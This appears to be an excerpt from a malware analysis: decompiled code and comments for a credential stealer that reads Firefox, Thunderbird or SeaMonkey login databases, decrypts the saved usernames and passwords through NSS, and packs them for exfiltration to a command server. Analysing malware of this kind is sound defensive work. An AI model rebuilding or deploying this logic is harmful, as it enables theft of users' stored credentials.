/* CASE-02 — Mozilla NSS credential decryptor (Vivarium decompile, inert binary-derived data).
 * FUN_00008b88(param_1): param_1 1=Firefox 2=Thunderbird 6=SeaMonkey.
 * Reads <profile>/signons.sqlite, `select * from moz_logins`, and uses NSS
 * (PK11SDR_Decrypt) to recover PLAINTEXT usernames (col 6) + passwords (col 7),
 * packing each as BEL-delimited "%c%s\a%s\a%s\b\b\b\b" for C2 exfil.
 * dlsym targets: NSS_Init, PK11_GetInternalKeySlot, PK11_Authenticate,
 *   NSSBase64_DecodeBuffer, PK11SDR_Decrypt, PK11_FreeSlot, NSS_Shutdown,
 *   sqlite3_open/close/prepare_v2/step/column_text.
 * (Excerpt of the Ghidra output; full logic reviewed live.)
 */
int FUN_00008b88(int param_1)
{
  /* ... profiles.ini resolved per-browser (FUN_00008541/FUN_00008a23) ... */
  _snprintf(local_e60, 0x500, "%s/signons.sqlite", local_13e4);
  /* dlsym NSS_Init / PK11_GetInternalKeySlot / PK11_Authenticate /
     NSSBase64_DecodeBuffer / PK11SDR_Decrypt / PK11_FreeSlot / NSS_Shutdown
     + sqlite3_open/close/prepare_v2/step/column_text */
  (*pcVar13)(local_1364, "select *  from moz_logins", 0x19, &local_1368, local_136c);
  /* per row: base64-decode col 6 (user) and col 7 (pass), PK11SDR_Decrypt each,
     then: */
  _asprintf(&local_1370, "%c%s\a%s\a%s\b\b\b\b", param_1, iVar18, local_260, local_460);
  /* append to exfil buffer (FUN_000096ea) */
}
